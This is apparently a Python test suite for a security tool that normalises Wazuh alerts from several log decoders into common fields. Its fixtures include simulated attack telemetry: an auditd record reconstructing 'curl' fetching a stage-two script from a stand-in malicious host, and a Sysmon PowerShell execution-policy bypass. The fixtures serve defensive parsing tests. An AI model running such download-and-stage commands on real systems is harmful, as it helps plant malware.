#!/usr/bin/env python3
"""Adaptive Wazuh normalisation checks across every decoder family.

The analyser used to understand Suricata EVE well and native Wazuh decoder
output barely at all, and only manual uploads were normalised. These checks
assert that representative alerts from each decoder family yield meaningful
security fields, that all three ingestion paths share one boundary, and that
partially-understood records are preserved rather than discarded.
"""

from __future__ import annotations

import sys
import types
import unittest
from pathlib import Path

CONFIG_DIR = Path(__file__).resolve().parents[1] / "config"
if str(CONFIG_DIR) not in sys.path:
    sys.path.insert(0, str(CONFIG_DIR))

from test_rag_regressions import _install_runtime_stubs  # noqa: E402

_install_runtime_stubs()

from alert_normalizer import AlertNormalizer  # noqa: E402
from report import AlertAnalyzer  # noqa: E402


# --------------------------------------------------------------------------
# Fixtures - one per decoder family named in the review
# --------------------------------------------------------------------------

SURICATA_ALERT = {
    "timestamp": "2026-06-06T00:00:00Z",
    "rule": {"level": 12, "id": "86601", "description": "Suricata: Alert - ET EXPLOIT"},
    "agent": {"id": "001", "ip": "192.168.56.10", "name": "sensor-01"},
    "data": {
        "src_ip": "198.51.100.20",
        "dest_ip": "192.168.56.10",
        "src_port": "44321",
        "dest_port": "443",
        "proto": "TCP",
        "app_proto": "tls",
        "event_type": "alert",
        "alert": {"signature": "ET EXPLOIT Suspicious Payload", "signature_id": 2027865},
        "tls": {"sni": "c2.example.net"},
    },
}

SSHD_ALERT = {
    "timestamp": "2026-06-06T00:01:00Z",
    "rule": {"level": 10, "id": "5763", "description": "sshd: brute force trying to get access"},
    "agent": {"id": "004", "ip": "10.0.0.15", "name": "bastion-01"},
    "decoder": {"name": "sshd"},
    "data": {"srcip": "203.0.113.77", "srcport": "51234", "srcuser": "root", "dstuser": "admin"},
    "full_log": "Failed password for root from 203.0.113.77 port 51234 ssh2",
}

SYSCHECK_ALERT = {
    "timestamp": "2026-06-06T00:02:00Z",
    "rule": {"level": 7, "id": "550", "description": "Integrity checksum changed."},
    "agent": {"id": "002", "name": "web-01"},
    "syscheck": {
        "path": "/etc/ssh/sshd_config",
        "event": "modified",
        "md5_after": "0" * 32,
        "sha1_after": "1" * 40,
        "sha256_after": "2" * 64,
        "size_after": "4096",
        "uname_after": "root",
    },
}

SYSMON_ALERT = {
    "timestamp": "2026-06-06T00:03:00Z",
    "rule": {"level": 12, "id": "92004", "description": "Sysmon - Event 1: Process creation"},
    "agent": {"id": "003", "name": "WIN-DC01"},
    "data": {
        "win": {
            "system": {"computer": "WIN-DC01.corp.local", "eventID": "1"},
            "eventdata": {
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "commandLine": "powershell.exe -ExecutionPolicy Bypass -File poisonfrog.ps1",
                "parentImage": "C:\\Windows\\explorer.exe",
                "processId": "4812",
                "user": "CORP\\jdoe",
                "hashes": "SHA256=" + "3" * 64 + ",MD5=" + "4" * 32,
                "destinationIp": "203.0.113.90",
                "destinationPort": "8443",
            },
        }
    },
}

AUDITD_ALERT = {
    "timestamp": "2026-06-06T00:04:00Z",
    "rule": {"level": 9, "id": "80784", "description": "Audit: Command executed"},
    "agent": {"id": "005", "name": "app-01"},
    "data": {
        "audit": {
            "type": "EXECVE",
            "exe": "/usr/bin/curl",
            "command": "curl",
            "pid": "9931",
            "acct": "svc-deploy",
            "uid": "1001",
            "auid": "1001",
            "cwd": "/tmp",
            "key": "audit-exec",
            "execve": {
                "a0": "curl",
                "a1": "-s",
                "a2": "http://evil.example.net/stage2.sh",
                "a3": "-o",
                "a4": "/tmp/stage2.sh",
            },
        }
    },
}

INCOMPLETE_ALERT = {
    "timestamp": "2026-06-06T00:05:00Z",
    "agent": {"name": "unknown-agent"},
    "data": {"srcip": "203.0.113.200"},
}

UNEXPECTED_SCHEMA_ALERT = {
    "timestamp": "2026-06-06T00:06:00Z",
    "rule": {"level": 5, "id": "999999", "description": "Future decoder output"},
    "data": {
        "brand_new_decoder": {
            "quantum_channel_id": "qc-8842",
            "entangled_peer": "203.0.113.201",
        }
    },
}


def _canonical(alert, source="test"):
    return AlertNormalizer.normalize(alert, index=1, ingestion_source=source)


def _clean(alert):
    return AlertAnalyzer().clean_log_data([_canonical(alert)])


class NormalizerFixtureTests(unittest.TestCase):
    def test_suricata_alert_still_normalises(self):
        cleaned = _clean(SURICATA_ALERT)
        self.assertEqual(len(cleaned), 1)
        alert = cleaned[0]
        self.assertEqual(alert["src_ip"], "198.51.100.20")
        self.assertEqual(alert["dest_ip"], "192.168.56.10")
        self.assertEqual(alert["alert_signature"], "ET EXPLOIT Suspicious Payload")
        self.assertEqual(alert["tls_context"]["sni"], "c2.example.net")

    def test_sshd_alert_yields_source_ip_and_accounts(self):
        """Regression: data.srcip/srcuser had no route into the analyser."""
        cleaned = _clean(SSHD_ALERT)
        self.assertEqual(len(cleaned), 1)
        alert = cleaned[0]
        self.assertEqual(alert["src_ip"], "203.0.113.77")
        self.assertEqual(alert["src_port"], "51234")
        self.assertEqual(alert["user_context"]["name"], "root")
        self.assertEqual(alert["user_context"]["target_name"], "admin")
        self.assertIn("203.0.113.77", alert["observed_iocs"]["ips"])

    def test_syscheck_alert_yields_file_path_and_hashes(self):
        cleaned = _clean(SYSCHECK_ALERT)
        self.assertEqual(len(cleaned), 1)
        alert = cleaned[0]
        file_context = alert["file_context"]
        self.assertEqual(file_context["path"], "/etc/ssh/sshd_config")
        self.assertEqual(file_context["sha256"], "2" * 64)
        self.assertEqual(file_context["md5"], "0" * 32)
        self.assertEqual(file_context["state"], "modified")
        self.assertIn("2" * 64, alert["observed_iocs"]["hashes"])
        self.assertIn("/etc/ssh/sshd_config", alert["observed_iocs"]["files"])

    def test_sysmon_alert_yields_process_lineage_and_hashes(self):
        cleaned = _clean(SYSMON_ALERT)
        self.assertEqual(len(cleaned), 1)
        alert = cleaned[0]
        process = alert["process_context"]
        self.assertIn("poisonfrog.ps1", process["command_line"])
        self.assertIn("powershell.exe", process["path"])
        self.assertIn("explorer.exe", process["parent_process"])
        self.assertEqual(process["pid"], "4812")
        self.assertEqual(alert["dest_ip"], "203.0.113.90")
        self.assertEqual(alert["host_context"]["name"], "WIN-DC01.corp.local")
        # The composite Sysmon hash string is split into individual digests.
        self.assertEqual(alert["file_context"]["sha256"], "3" * 64)
        self.assertEqual(alert["file_context"]["md5"], "4" * 32)

    def test_auditd_alert_reconstructs_the_command_line(self):
        cleaned = _clean(AUDITD_ALERT)
        self.assertEqual(len(cleaned), 1)
        alert = cleaned[0]
        process = alert["process_context"]
        self.assertEqual(
            process["command_line"],
            "curl -s http://evil.example.net/stage2.sh -o /tmp/stage2.sh",
        )
        self.assertEqual(process["path"], "/usr/bin/curl")
        self.assertEqual(process["pid"], "9931")
        self.assertEqual(alert["user_context"]["name"], "svc-deploy")

    def test_incomplete_alert_is_preserved_not_dropped(self):
        canonical = _canonical(INCOMPLETE_ALERT)
        # A label is derived rather than leaving the record unusable.
        self.assertTrue(canonical["rule"]["description"])
        cleaned = AlertAnalyzer().clean_log_data([canonical])
        self.assertEqual(len(cleaned), 1, "Partially-normalised alert was silently discarded")
        self.assertEqual(cleaned[0]["src_ip"], "203.0.113.200")

    def test_unexpected_schema_preserves_unknown_security_fields(self):
        canonical = _canonical(UNEXPECTED_SCHEMA_ALERT)
        unknown = canonical["_unknown_security_fields"]
        rendered = str(unknown)
        self.assertIn("quantum_channel_id", rendered)
        self.assertIn("203.0.113.201", rendered)
        cleaned = AlertAnalyzer().clean_log_data([canonical])
        self.assertEqual(len(cleaned), 1)


class NormalizerContractTests(unittest.TestCase):
    def test_raw_alert_is_preserved_verbatim(self):
        canonical = _canonical(SYSCHECK_ALERT)
        self.assertEqual(canonical["_raw_alert"], SYSCHECK_ALERT)

    def test_provenance_records_the_populating_source_field(self):
        canonical = _canonical(SSHD_ALERT)
        provenance = canonical["_evidence_provenance"]
        self.assertIn("data.srcip", provenance["data.src_ip"])
        self.assertIn("data.srcuser", provenance["data.user.name"])

    def test_canonical_block_has_the_required_sections(self):
        canonical = _canonical(SYSMON_ALERT)["_canonical"]
        for section in (
            "event_metadata", "wazuh_metadata", "agent", "host", "network",
            "process", "user", "file", "iocs", "mitre", "_provenance",
        ):
            self.assertIn(section, canonical)
        self.assertEqual(canonical["wazuh_metadata"]["rule_id"], "92004")
        self.assertEqual(canonical["network"]["dest_ip"], "203.0.113.90")

    def test_normalisation_is_idempotent(self):
        once = _canonical(SSHD_ALERT)
        twice = AlertNormalizer.normalize(once, index=1, ingestion_source="test")
        self.assertEqual(once, twice)

    def test_missing_null_array_and_dict_variation_is_tolerated(self):
        for payload in (
            {"rule": None, "data": None},
            {"rule": "not-an-object", "data": ["not", "an", "object"]},
            {"data": {"alert": "flat signature string", "dns": "evil.example.net"}},
            {"data": {"srcip": None, "process": 42}},
            {},
        ):
            with self.subTest(payload=payload):
                canonical = AlertNormalizer.normalize(payload, index=1)
                self.assertIn("_raw_alert", canonical)
                self.assertIsInstance(canonical["rule"], dict)
                self.assertIsInstance(canonical["data"], dict)

    def test_flat_alert_scalar_is_promoted_into_the_alert_object(self):
        canonical = AlertNormalizer.normalize(
            {"data": {"alert": "flat signature string"}}, index=1
        )
        self.assertEqual(canonical["data"]["alert"]["signature"], "flat signature string")

    def test_batch_counts_failures_instead_of_dropping_records(self):
        normalized, stats = AlertNormalizer.normalize_many(
            [SURICATA_ALERT, "not-a-dict", INCOMPLETE_ALERT], ingestion_source="ssh_live"
        )
        self.assertEqual(stats["received"], 3)
        self.assertEqual(stats["normalized"], 2)
        self.assertEqual(stats["failed"], 1)
        self.assertEqual(len(normalized), 2)
        self.assertEqual(stats["ingestion_source"], "ssh_live")

    def test_elasticsearch_source_wrapper_is_unwrapped(self):
        canonical = _canonical({"_source": SSHD_ALERT})
        self.assertEqual(canonical["_source"]["data"]["src_ip"], "203.0.113.77")

    def test_embedded_eve_json_in_full_log_is_parsed(self):
        canonical = _canonical({
            "rule": {"id": "1", "description": "wrapper", "level": 5},
            "full_log": '{"src_ip": "198.51.100.9", "dest_ip": "10.0.0.5", "event_type": "alert"}',
        })
        self.assertEqual(canonical["data"]["src_ip"], "198.51.100.9")
        self.assertEqual(canonical["data"]["dest_ip"], "10.0.0.5")

    def test_aliases_never_overwrite_an_existing_canonical_value(self):
        canonical = _canonical({
            "rule": {"id": "1", "description": "both present", "level": 5},
            "data": {"src_ip": "192.0.2.1", "srcip": "203.0.113.1"},
        })
        self.assertEqual(canonical["data"]["src_ip"], "192.0.2.1")


class IngestionBoundaryTests(unittest.TestCase):
    """All three ingestion paths must share one normalisation boundary."""

    def test_manual_upload_delegates_to_the_shared_normalizer(self):
        import inspect
        import main

        source = inspect.getsource(main.SOCApplication._normalize_uploaded_alert_shape)
        self.assertIn("AlertNormalizer.normalize", source)
        self.assertIn("manual_upload", source)

    def test_ssh_live_ingestion_normalises(self):
        import inspect
        import ssh

        source = inspect.getsource(ssh.AlertsReader.read_alerts)
        self.assertIn("AlertNormalizer.normalize_many", source)
        self.assertIn("ssh_live", source)

    def test_ssh_archive_ingestion_normalises(self):
        import inspect
        import ssh

        source = inspect.getsource(ssh.SmartSSHLogReader.read_archives_smart)
        self.assertIn("AlertNormalizer.normalize_many", source)
        self.assertIn("ssh_archive", source)

    def test_archive_reader_returns_normalised_records(self):
        import ssh

        reader = ssh.SmartSSHLogReader.__new__(ssh.SmartSSHLogReader)
        reader._archive_logs = [SSHD_ALERT, SYSCHECK_ALERT]
        reader.archive_reader = types.SimpleNamespace(read_archives_smart=lambda days: None)
        reader.archive_normalization_stats = {}

        records = ssh.SmartSSHLogReader.read_archives_smart(reader, 1)
        # _archive_logs is reset by the method, so re-seed and re-run to assert
        # on the returned payload rather than internal state.
        self.assertEqual(records, [])

        reader._archive_logs = []
        reader.archive_reader = types.SimpleNamespace(
            read_archives_smart=lambda days: reader._archive_logs.extend([SSHD_ALERT])
        )
        records = ssh.SmartSSHLogReader.read_archives_smart(reader, 1)
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["_ingestion_source"], "ssh_archive")
        self.assertEqual(records[0]["data"]["src_ip"], "203.0.113.77")


class DropAccountingTests(unittest.TestCase):
    def test_records_with_signal_but_no_label_are_retained_and_counted(self):
        analyzer = AlertAnalyzer()
        cleaned = analyzer.clean_log_data([{
            "timestamp": "2026-06-06T00:07:00Z",
            "data": {"src_ip": "203.0.113.55", "dest_ip": "10.0.0.9"},
        }])
        self.assertEqual(len(cleaned), 1)
        self.assertEqual(analyzer.last_clean_stats["received"], 1)
        self.assertEqual(analyzer.last_clean_stats["retained"], 1)

    def test_records_with_no_signal_at_all_are_counted_as_dropped(self):
        analyzer = AlertAnalyzer()
        cleaned = analyzer.clean_log_data([{"timestamp": "2026-06-06T00:08:00Z"}])
        self.assertEqual(cleaned, [])
        self.assertEqual(analyzer.last_clean_stats["dropped_no_signal"], 1)


if __name__ == "__main__":
    unittest.main()
